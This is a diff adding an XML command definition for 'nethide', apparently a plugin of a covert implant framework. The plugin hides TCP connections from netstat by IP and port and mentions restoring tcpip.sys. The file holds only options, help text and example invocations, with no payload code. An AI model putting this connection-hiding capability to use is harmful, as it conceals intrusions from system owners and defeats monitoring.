@@ -1,0 +1,131 @@
+<?xml version='1.0' ?>
+
+<Plugin id='31378'>
+
+  <Command id='16' name='nethide'>
+
+    <Help>Hides/Unhides TCP network connections from netstat (20 connections max).</Help>
+   
+    <Input>
+      <Option name='list' optional='false' group='groupThese'>
+	<Set data='action' value='0'/>
+	<Help>List all hidden connections.</Help>
+      </Option>
+
+      <Option name='hide' optional='false' group='groupThese'>
+	<Set data='action' value='1'/>
+	<Set data='ipAddr' value="any" />
+	<Set data='port0'  value='0'/>
+	<Help>Hide a connection based on IP address and/or port by adding the -ip</Help>
+	<Help>-port flags.  Defaults to local addresses.  Use the -remote flag</Help>
+	<Help>hide by remote addresses.</Help>
+      </Option>
+
+      <Option name='unhide' optional='false' group='groupThese'>
+	<Argument name='index0' data='index0' />
+	<Argument name='index1' data='index1' optional='true'/>
+	<Argument name='index2' data='index2' optional='true'/>
+	<Argument name='index3' data='index3' optional='true'/>
+	<Argument name='index4' data='index4' optional='true'/>
+	<Argument name='index5' data='index5' optional='true'/>
+	<Argument name='index6' data='index6' optional='true'/>
+	<Argument name='index7' data='index7' optional='true'/>
+	<Argument name='index8' data='index8' optional='true'/>
+	<Argument name='index9' data='index9' optional='true'/>
+	<Set data='action' value='3'/>
+	<Help>Unhide the addr at the given index.  Use -remote for a remote index.</Help>
+      </Option>
+
+      <Option name='ip' optional='true'>
+	<Argument name='ipAddr' data='ipAddr'/>
+	<Help>Hide an IP address.  Use this option with the 'hide' command.</Help>
+	<Help>If not used, any IP address will be matched.</Help>
+      </Option>     
+
+      <Option name='port' optional='true'>
+	<Argument name='port0' data='port0'/>
+	<Argument name='port1' data='port1' optional='true'/>
+	<Argument name='port2' data='port2' optional='true'/>
+	<Argument name='port3' data='port3' optional='true'/>
+	<Argument name='port4' data='port4' optional='true'/>
+	<Argument name='port5' data='port5' optional='true'/>
+	<Argument name='port6' data='port6' optional='true'/>
+	<Argument name='port7' data='port7' optional='true'/>
+	<Argument name='port8' data='port8' optional='true'/>
+	<Argument name='port9' data='port9' optional='true'/>	
+	<Help>Enter a list of ports separated by a space.  Use -remote to specify</Help>
+	<Help>remote ports.  All ports will be paired with the same IP address.</Help>
+      </Option>
+
+      <Option name='remote' optional='true'>
+	<Set data='remote' value='true' />
+	<Help>Perform action on remote addresses.</Help>
+      </Option>
+
+      <Option name='unhideall' optional='false' group='groupThese'>
+	<Set data='action' value='5'/>
+	<Help>Unhide all hidden connections.</Help>
+      </Option>
+
+      <Option name='clean' optional='false' group='groupThese'>
+	<Set data='action' value='6'/>
+	<Help>Unhides all connections, frees memory, and restores tcpip.sys</Help>
+      </Option>
+
+      <Option name='delay' optional='true'>
+	<Argument name='milliseconds' data='delay'/>
+	<Help>Optionally specify sleep delay in mS(max 3000) for affinity mask.</Help>
+      
+        <Help> </Help>
+      	<Help>Examples:</Help>
+        <Help>-------------------------------------------------</Help>
+      	<Help>List:</Help>
+      	<Help>	nethide -list</Help>
+      	<Help>Hide:</Help>
+      	<Help>	nethide -hide -ip 192.168.1.1 -port 100</Help>
+      	<Help>	nethide -hide -remote -ip 10.1.1.10</Help>
+      	<Help>	nethide -hide -port 1150 21 25 80</Help>
+	<Help>	nethide -hide -ip 10.1.1.10 -port 80 135 445 -remote</Help>
+      	<Help>Unhide:</Help>
+      	<Help>	nethide -unhide 2</Help>
+	<Help>	nethide -unhide 0 1 3 -remote</Help>
+	<Help>	nethide -unhideall</Help>
+      	<Help>Clean:</Help>
+      	<Help>	nethide -clean</Help>
+      </Option>
+      
+    </Input>
+
+    <Output>
+	<Data name='action'  type='uint8_t'/>
+	<Data name='port'    type='uint16_t' default='0'/>
+	<Data name='delay'   type='uint32_t' default='3000'/> 
+	<Data name='ipAddr'  type='string'/>
+	<Data name='remote'  type='bool'/>
+	<Data name='index0'   type='uint8_t' default='255'/>
+	<Data name='index1'   type='uint8_t' default='255'/>
+	<Data name='index2'   type='uint8_t' default='255'/>
+	<Data name='index3'   type='uint8_t' default='255'/>
+	<Data name='index4'   type='uint8_t' default='255'/>
+	<Data name='index5'   type='uint8_t' default='255'/>
+	<Data name='index6'   type='uint8_t' default='255'/>
+	<Data name='index7'   type='uint8_t' default='255'/>
+	<Data name='index8'   type='uint8_t' default='255'/>
+	<Data name='index9'   type='uint8_t' default='255'/>
+	<Data name='port0'   type='uint16_t' default='65535'/>
+	<Data name='port1'   type='uint16_t' default='65535'/>
+	<Data name='port2'   type='uint16_t' default='65535'/>
+	<Data name='port3'   type='uint16_t' default='65535'/>
+	<Data name='port4'   type='uint16_t' default='65535'/>
+	<Data name='port5'   type='uint16_t' default='65535'/>
+	<Data name='port6'   type='uint16_t' default='65535'/>
+	<Data name='port7'   type='uint16_t' default='65535'/>
+	<Data name='port8'   type='uint16_t' default='65535'/>
+	<Data name='port9'   type='uint16_t' default='65535'/>
+    </Output>
+
+  </Command>
+
+</Plugin>
+
+
